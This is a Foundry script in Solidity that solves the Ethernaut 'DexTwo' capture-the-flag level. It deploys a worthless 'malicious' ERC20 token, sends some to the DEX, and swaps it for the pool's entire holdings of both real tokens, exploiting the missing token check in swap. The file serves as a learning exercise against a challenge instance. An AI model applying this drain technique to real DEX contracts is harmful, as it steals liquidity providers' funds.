// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DexTwo, SwappableTokenTwo} from "../src/23-DexTwo.sol";
import {DexTwoFactory} from "../src/DexTwoFactory.sol";
import {Script, console} from "forge-std/Script.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoSolution is Script {
    DexTwo public dexLevel;
    address payable instanceAddress = payable(0x25C7acdDfc63BFA719517e54bffBcE6B7C0D289B);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        dexLevel = DexTwo(instanceAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        MaliciousSwappableToken maliciousToken = new MaliciousSwappableToken(address(dexLevel), "MALICOUS", "MAL", 4);
        IERC20(maliciousToken).transfer(instanceAddress, 1);

        address token1 = dexLevel.token1();
        address token2 = dexLevel.token2();

        IERC20(token1).approve(address(dexLevel), type(uint256).max);
        IERC20(token2).approve(address(dexLevel), type(uint256).max);
        IERC20(maliciousToken).approve(address(dexLevel), type(uint256).max);

        dexLevel.swap(address(maliciousToken), token1, 1);
        dexLevel.swap(address(maliciousToken), token2, 2);

        vm.stopBroadcast();

        validate();
    }

    function validate() internal {
        bool isValidated = new DexTwoFactory().validateInstance(instanceAddress, publicKey);
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract MaliciousSwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
